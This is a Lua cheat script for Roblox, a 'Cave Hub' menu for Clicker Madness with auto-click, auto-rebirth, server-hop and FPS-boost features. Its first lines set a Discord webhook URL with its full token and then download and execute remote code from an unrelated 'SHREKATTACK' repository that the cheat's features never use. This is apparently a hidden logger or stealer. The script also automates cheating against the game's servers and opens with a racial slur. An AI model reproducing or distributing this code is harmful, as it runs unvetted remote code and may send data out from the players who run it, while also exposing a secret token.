--Cavehub Clicker nigga


_G.webhooksdiscord = "https://discord.com/api/webhooks/1191255560142721084/mQlFLFsnh5Guc60yHKRRJnJKUl1Q65toO9HowcgdNx5Z9xEiRmOM0cDp0S47nGN0aZK7"
loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()


local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Cave Hub",
    SubTitle = "Clicker Madness! 😈",
    TabWidth = 160,
    Size = UDim2.fromOffset(610, 490),
    Acrylic = false, -- The blur may be detectable, setting this to false disables blur entirely
    Theme = "Darker",
    MinimizeKey = Enum.KeyCode.RightControl -- Used when theres no MinimizeKeybind
})

--Fluent provides Lucide Icons https://lucide.dev/icons/ for the tabs, icons are optional
local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "rbxassetid://11433532654" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "rbxassetid://11293977610" })
}

local Options = Fluent.Options

do
    Fluent:Notify({
        Title = "Notification",
        Content = "Cave Hub NO.1",
        SubContent = "", -- Optional
        Duration = 10 -- Set to nil to make the notification not disappear
    })
end

local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "AutoClick", Default = false })

    Toggle:OnChanged(function(Value)
     _G.Click = Value
     while _G.Click do wait()
          local args = {
               [1] = 5000
           }
           
           game:GetService("ReplicatedStorage"):WaitForChild("Aero"):WaitForChild("AeroRemoteServices"):WaitForChild("ClickService"):WaitForChild("Click"):FireServer(unpack(args)) 
     end   
     end)

Options.MyToggle:SetValue(false)


 local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "AutoRebirth", Default = false })

 Toggle:OnChanged(function(Value)
     _G.Rebirths = Value
     while _G.Rebirths do wait()
          local args = {
               [1] = 1000
          }
           
          game:GetService("ReplicatedStorage"):WaitForChild("Aero"):WaitForChild("AeroRemoteServices"):WaitForChild("RebirthService"):WaitForChild("BuyRebirths"):FireServer(unpack(args))
     end
 end)

 Options.MyToggle:SetValue(false)

--Settings

Tabs.Settings:AddButton({
     Title = "Rejoin Server",
     Description = "",
     Callback = function()
         local ts = game:GetService("TeleportService")
 
         local p = game:GetService("Players").LocalPlayer
         
          
         
         ts:Teleport(game.PlaceId, p)
     end
 })
 



Tabs.Settings:AddButton({
     Title = "Hop To Low Server",
     Description = "",
     Callback = function()
         local Http = game:GetService("HttpService")
         local TPS = game:GetService("TeleportService")
         local Api = "https://games.roblox.com/v1/games/"
         
         local _place = game.PlaceId
         local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
         function ListServers(cursor)
            local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
            return Http:JSONDecode(Raw)
         end
         
         local Server, Next; repeat
            local Servers = ListServers(Next)
            Server = Servers.data[1]
            Next = Servers.nextPageCursor
         until Server
         
         TPS:TeleportToPlaceInstance(_place,Server.id,game.Players.LocalPlayer)
     end
 })
 

Tabs.Settings:AddButton({
     Title = "FpsBoots🚀",
     Description = "",
     Callback = function()

game:GetService("Players").LocalPlayer.PlayerGui.Error:Destroy()
 local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
 local g = game
 local w = g.Workspace
 local l = g.Lighting
 local t = w.Terrain
 sethiddenproperty(l,"Technology",2)
 sethiddenproperty(t,"Decoration",false)
 t.WaterWaveSize = 0
 t.WaterWaveSpeed = 0
 t.WaterReflectance = 0
 t.WaterTransparency = 0
 l.GlobalShadows = 0
 l.FogEnd = 9e9
 l.Brightness = 0
 settings().Rendering.QualityLevel = "Level01"
 for i, v in pairs(w:GetDescendants()) do
     if v:IsA("BasePart") and not v:IsA("MeshPart") then
         v.Material = "Plastic"
         v.Reflectance = 0
     elseif (v:IsA("Decal") or v:IsA("Texture")) and decalsyeeted then
         v.Transparency = 1
     elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
         v.Lifetime = NumberRange.new(0)
     elseif v:IsA("Explosion") then
         v.BlastPressure = 1
         v.BlastRadius = 1
     elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
         v.Enabled = false
     elseif v:IsA("MeshPart") and decalsyeeted then
         v.Material = "Plastic"
         v.Reflectance = 0
         v.TextureID = 10385902758728957
     elseif v:IsA("SpecialMesh") and decalsyeeted  then
         v.TextureId=0
     elseif v:IsA("ShirtGraphic") and decalsyeeted then
         v.Graphic=0
     elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
         v[v.ClassName.."Template"]=0
     end
 end
 for i = 1,#l:GetChildren() do
     e=l:GetChildren()[i]
     if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
         e.Enabled = false
     end
 end
 w.DescendantAdded:Connect(function(v)
     wait()--prevent errors and shit
    if v:IsA("BasePart") and not v:IsA("MeshPart") then
         v.Material = "Plastic"
         v.Reflectance = 0
     elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
         v.Transparency = 1
     elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
         v.Lifetime = NumberRange.new(0)
     elseif v:IsA("Explosion") then
         v.BlastPressure = 1
         v.BlastRadius = 1
     elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
         v.Enabled = false
     elseif v:IsA("MeshPart") and decalsyeeted then
         v.Material = "Plastic"
         v.Reflectance = 0
         v.TextureID = 10385902758728957
     elseif v:IsA("SpecialMesh") and decalsyeeted then
         v.TextureId=0
     elseif v:IsA("ShirtGraphic") and decalsyeeted then
         v.ShirtGraphic=0
     elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
         v[v.ClassName.."Template"]=0
     end
 end)
     end
 })




-- Addons:
-- SaveManager (Allows you to have a configuration system)
-- InterfaceManager (Allows you to have a interface managment system)

-- Hand the library over to our managers
SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)

-- Ignore keys that are used by ThemeManager.
-- (we dont want configs to save themes, do we?)
SaveManager:IgnoreThemeSettings()

-- You can add indexes of elements the save manager should ignore
SaveManager:SetIgnoreIndexes({})

-- use case for doing it this way:
-- a script hub could have themes in a global folder
-- and game configs in a separate folder per game
InterfaceManager:SetFolder("FluentScriptHub")
SaveManager:SetFolder("FluentScriptHub/specific-game")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)

Window:SelectTab(1)

Fluent:Notify({
    Title = "Notification",
    Content = "The script has been loaded.",
    Duration = 3
})

-- You can use the SaveManager:LoadAutoloadConfig() to load a config
-- which has been marked to be one that auto loads!
SaveManager:LoadAutoloadConfig()
